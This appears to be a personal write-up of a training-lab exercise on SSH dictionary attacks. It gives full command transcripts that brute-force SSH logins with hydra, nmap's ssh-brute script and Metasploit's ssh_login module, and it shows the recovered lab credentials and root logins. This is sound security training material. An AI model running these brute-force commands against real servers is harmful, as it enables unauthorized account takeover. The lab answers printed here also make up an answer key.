### Dictionary attacks

`ris:PriceTag3` [[Servers and Services#SSH|SSH]]
`ris:Tools` [[Hack2.0/hydra|hydra]] [[Hack2.0/NMAP|NMAP]] [[metasploit]]

1. Find the password of user “student” using hydra.
2. Find the password of user “administrator” use appropriate Nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
3. Find the password of user “root” using ssh_login Metasploit module with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt
4. What is the message of the day? (Printed after the user logs in to the SSH server).

[[ip]]

```
root@attackdefense:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
2753: eth0@if2754: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:01:00:04 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.1.0.4/16 brd 10.1.255.255 scope global eth0
       valid_lft forever preferred_lft forever
2756: eth1@if2757: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:59:a0:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.89.160.2/24 brd 192.89.160.255 scope global eth1
       valid_lft forever preferred_lft forever
```

[[ping]]

```
root@attackdefense:~# ping -c 5 192.89.160.3
PING 192.89.160.3 (192.89.160.3) 56(84) bytes of data.
64 bytes from 192.89.160.3: icmp_seq=1 ttl=64 time=0.119 ms
64 bytes from 192.89.160.3: icmp_seq=2 ttl=64 time=0.022 ms
64 bytes from 192.89.160.3: icmp_seq=3 ttl=64 time=0.021 ms
64 bytes from 192.89.160.3: icmp_seq=4 ttl=64 time=0.022 ms
64 bytes from 192.89.160.3: icmp_seq=5 ttl=64 time=0.026 ms

--- 192.89.160.3 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 95ms
rtt min/avg/max/mdev = 0.021/0.042/0.119/0.038 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap 192.89.160.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 10:40 UTC
Nmap scan report for target-1 (192.89.160.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:C0:59:A0:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

[[Hack2.0/NMAP#Service version|NMAP version check]]

```
root@attackdefense:~# nmap -p22 -sV -O 192.89.160.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 10:40 UTC
Nmap scan report for target-1 (192.89.160.3)
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:59:A0:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds
```

[[Hack2.0/hydra|hydra]]

```
root@attackdefense:~# hydra -l student -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.89.160.3 ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-10 10:43:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ssh://192.89.160.3:22/
[STATUS] 180.00 tries/min, 180 tries in 00:01h, 833 to do in 00:05h, 16 active
[22][ssh] host: 192.89.160.3   login: student   password: friend
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-10 10:45:21
```

verifying password

```
root@attackdefense:~# ssh student@192.89.160.3
The authenticity of host '192.89.160.3 (192.89.160.3)' can't be established.
ECDSA key fingerprint is SHA256:dxlBXgBb0Iv5/LmemZ2Eikb5+GLl9CSLf/B854fUeV8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.89.160.3' (ECDSA) to the list of known hosts.
Ubuntu 16.04.5 LTS
student@192.89.160.3's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SSH recon dictionary attack lab

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

student@victim-1:~$ ls
student@victim-1:~$ whoami
student
student@victim-1:~$ logout
Connection to 192.89.160.3 closed.
```

[[Hack2.0/NMAP#Specific script|NMAP brute force script]]

```
root@attackdefense:~# cat /usr/share/nmap/scripts/script.db | grep "ssh"
Entry { filename = "ssh-auth-methods.nse", categories = { "auth", "intrusive", } }
Entry { filename = "ssh-brute.nse", categories = { "brute", "intrusive", } }
Entry { filename = "ssh-hostkey.nse", categories = { "default", "discovery", "safe", } }
Entry { filename = "ssh-publickey-acceptance.nse", categories = { "auth", "intrusive", } }
Entry { filename = "ssh-run.nse", categories = { "intrusive", } }
Entry { filename = "ssh2-enum-algos.nse", categories = { "discovery", "safe", } }
Entry { filename = "sshv1.nse", categories = { "default", "safe", } }
root@attackdefense:~# nmap --script-help ssh-brute
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 10:48 UTC

ssh-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/ssh-brute.html
  Performs brute-force password guessing against ssh servers.
root@attackdefense:~# echo "administrator" > users
root@attackdefense:~# nmap -p22 --script ssh-brute --script-args userdb=/root/users 192.89.160.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 10:50 UTC
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NSE: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
Nmap scan report for target-1 (192.89.160.3)
Host is up (0.000049s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute: 
|   Accounts: 
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 27 guesses in 7 seconds, average tps: 3.9
MAC Address: 02:42:C0:59:A0:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds
```

[[metasploit]]

```
root@attackdefense:~# msfconsole 
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: could not connect to server: Connection refused
        Is the server running on host "localhost" (127.0.0.1) and accepting
        TCP/IP connections on port 5432?
could not connect to server: Cannot assign requested address
        Is the server running on host "localhost" (::1) and accepting
        TCP/IP connections on port 5432?

[-] ***
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.18-dev                          ]
+ -- --=[ 1882 exploits - 1062 auxiliary - 328 post       ]
+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   1  auxiliary/scanner/ssh/ssh_login                          normal  Yes    SSH Login Check Scanner
   2  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  Yes    SSH Public Key Login Scanner
   
msf5 > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set rhosts 192.89.160.3
rhosts => 192.89.160.3
msf5 auxiliary(scanner/ssh/ssh_login) > set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
userpass_file => /usr/share/wordlists/metasploit/root_userpass.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set verbose true
verbose => true
msf5 auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
stop_on_success => true
msf5 auxiliary(scanner/ssh/ssh_login) > run

[-] 192.89.160.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.89.160.3:22 - Failed: 'root:!root'
[-] 192.89.160.3:22 - Failed: 'root:Cisco'
[-] 192.89.160.3:22 - Failed: 'root:NeXT'
[-] 192.89.160.3:22 - Failed: 'root:QNX'
[-] 192.89.160.3:22 - Failed: 'root:admin'
[+] 192.89.160.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.89.160.2:45507 -> 192.89.160.3:22) at 2023-07-10 11:02:50 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) >
```

[[ssh]]

```
root@attackdefense:~# ssh root@192.89.160.3
Ubuntu 16.04.5 LTS
root@192.89.160.3's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 5.4.0-153-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
SSH recon dictionary attack lab
root@victim-1:~# ls
root@victim-1:~# ls -la
total 24
drwx------ 1 root root 4096 Jul 10 11:02 .
drwxr-xr-x 1 root root 4096 Jul 10 10:38 ..
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
drwx------ 2 root root 4096 Jul 10 11:02 .cache
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxr-xr-x 2 root root 4096 Dec  2  2018 .ssh
root@victim-1:~# 
```

